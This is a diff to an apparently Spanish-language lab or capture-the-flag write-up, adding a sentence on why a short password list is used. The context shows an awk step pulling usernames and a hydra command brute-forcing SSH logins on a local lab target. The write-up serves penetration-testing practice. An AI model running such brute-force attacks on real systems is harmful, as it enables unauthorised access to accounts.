@@ -135,7 +135,7 @@ Copiamos el output a un archivo `valid_users.txt` y con `awk` nos quedamos solo 
 awk -F"'" '{print $2}' valid_users.txt > users.txt
 ```
 
-Ahora hacemos fuerza bruta con `hydra` para ver si encontramos alguna contraseña válida para alguno de los usuarios válidos
+Ahora hacemos fuerza bruta con `hydra` para ver si encontramos alguna contraseña válida para alguno de los usuarios válidos, usamos una lista relativamente corta porque si no va a tardar una eternidad probando todas las contraseñas por cada usuario encontrado.
 
 ```bash
 hydra -L users.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -t 4 -I -F ssh://172.17.0.2
